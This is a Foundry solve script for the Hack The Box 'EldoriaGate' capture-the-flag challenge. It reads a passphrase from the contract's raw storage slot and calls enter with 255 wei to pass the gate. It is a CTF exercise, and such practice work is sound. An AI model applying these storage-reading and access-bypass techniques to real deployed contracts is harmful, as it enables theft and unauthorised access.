pragma solidity ^0.8.26;

import {Script} from "forge-std/Script.sol";
import {Setup} from "src/HTB-CyberApocalypse-2025/EldoriaGate/Setup.sol";
import {EldoriaGate} from "src/HTB-CyberApocalypse-2025/EldoriaGate/EldoriaGate.sol";
import "forge-std/StdJson.sol"; 

contract Solve is Script{
    using stdJson for string;

    function run()public{
        address _setup;
        string memory Setup_path=string.concat("broadcast/Deploy.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        try vm.readFile(Setup_path){
            string memory json = vm.readFile(Setup_path);
            address deployed = json.readAddress(".transactions[0].contractAddress");
            _setup=deployed;
        }catch{
            revert("Challenge Not Yet Deployed");
        }

        vm.startBroadcast();
        Setup setup=Setup(_setup);
        EldoriaGate eldoriaGate=setup.TARGET();
        bytes32 slotValue=vm.load(address(eldoriaGate.kernel()), 0);
        bytes4 passphrase= bytes4(bytes4(bytes32(uint256(slotValue)<<224)));
        eldoriaGate.enter{value:255}(passphrase);
        require(setup.isSolved(),"Chall Unsolved");
        vm.stopBroadcast();
    }

}
